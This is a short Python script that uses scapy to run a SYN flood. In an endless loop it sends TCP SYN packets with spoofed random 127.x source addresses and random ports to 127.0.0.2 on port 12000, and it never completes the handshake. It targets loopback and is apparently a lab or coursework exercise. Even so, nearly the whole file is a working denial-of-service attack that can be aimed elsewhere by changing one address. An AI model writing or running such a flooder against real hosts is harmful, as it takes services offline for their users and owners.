import socket
from scapy.all import *

source = ["127.0.0.3", 80]
dest = ["127.0.0.2", 12000]
i = 1

addr='127.0.0.2'
dport=12000

def partial_handshake():
    conf.L3socket = L3RawSocket
    while True:
        srcip = '127.' + str(random.randint(1,255)) + '.' + str(random.randint(1,255)) + '.' + str(random.randint(3,255))
        sport = random.randint(1024,65535)
        seq = random.randint(1000,99999999)
        syn_pkg = IP(src=srcip, dst=addr)/TCP(sport=sport, dport=dport, flags='S', seq=seq)
	send(syn_pkg)


def main():
    partial_handshake()


if __name__ == "__main__":
    main()

